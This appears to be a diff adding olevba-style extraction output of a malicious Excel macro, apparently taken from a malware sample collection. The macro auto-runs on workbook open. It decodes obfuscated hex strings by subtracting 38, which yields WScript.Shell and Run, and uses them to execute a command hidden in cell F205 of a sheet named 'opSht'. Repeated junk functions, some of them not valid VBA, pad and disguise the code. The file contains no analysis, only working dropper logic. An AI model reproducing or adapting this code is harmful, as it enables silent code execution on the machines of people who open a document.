@@ -1,0 +1,77 @@
+Filename     : ./macros/d4b9b0e4041676c34fdaafa433a8834931d97d95938b74d381235bee410393eb
+OLE stream   : _VBA_PROJECT_CUR/VBA/ThisWorkbook
+VBA filename : ThisWorkbook.cls
+----------------------------------------
+Attribute VB_Name = "ThisWorkbook"
+Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = True
+Option Explicit
+Private Function NSP() As String
+Dim aNSP As String
+aNSP = "40403540404068401A334047406940135B40515938404340421F404046406B40407340174040214079407340403040401366405C"
+Dim reNSP = aNSP
+Dim reMsgBox(Mid(aNSP & reNSP, 28))
+End Function
+
+Public Function IG_H(ByVal HH_B As String)
+   Dim QC_K As String
+   Dim F_N As Long
+   For F_N = 1 To Len(HH_B) Step 2
+        Dim H_NZC As Long: H_NZC = CLng(Chr(38) & Chr(72) & Mid(HH_B, F_N, 2))
+        QC_K = QC_K & Chr(H_NZC - 38)
+   Next
+   IG_H = QC_K
+End Function
+Private Function VHY() As String
+Dim aVHY As String
+aVHY = "40403540404068401A334047406940135B40515938404340421F404046406B40407340174040214079407340403040401366405C"
+Dim reVHY = aVHY
+Dim reMsgBox(Mid(aVHY & reVHY, 28))
+End Function
+
+Sub KZYUKLQJ_YARIWSJE()
+    P_AUP
+End Sub
+Private Function ACU() As String
+Dim aACU As String
+aACU = "40403540404068401A334047406940135B40515938404340421F404046406B40407340174040214079407340403040401366405C"
+Dim reACU = aACU
+Dim reMsgBox(Mid(aACU & reACU, 28))
+End Function
+
+Public Sub Document_Open()
+    Application.Run IG_H("71807F7B71727770857F67786F7D79706B")
+End Sub
+Private Function DAE() As String
+Dim aDAE As String
+aDAE = "40403540404068401A334047406940135B40515938404340421F404046406B40407340174040214079407340403040401366405C"
+Dim reDAE = aDAE
+Dim reMsgBox(Mid(aDAE & reDAE, 28))
+End Function
+
+Sub Workbook_Open()
+    KZYUKLQJ_YARIWSJE
+End Sub
+Private Function RHT() As String
+Dim aRHT As String
+aRHT = "40403540404068401A334047406940135B40515938404340421F404046406B40407340174040214079407340403040401366405C"
+Dim reRHT = aRHT
+Dim reMsgBox(Mid(aRHT & reRHT, 28))
+End Function
+
+Public Sub P_AUP()
+    Dim HH_B As Object: Set HH_B = VBA.CreateObject(IG_H("7D7989988F969A54798E8B9292"))
+    CallByName HH_B, IG_H("789B94"), VbMethod, IG_H(ThisWorkbook.Sheets("opSht").Range("F205").Value), 0, True
+End Sub
+Private Function OHR() As String
+Dim aOHR As String
+aOHR = "40403540404068401A334047406940135B40515938404340421F404046406B40407340174040214079407340403040401366405C"
+Dim reOHR = aOHR
+Dim reMsgBox(Mid(aOHR & reOHR, 28))
+End Function
+
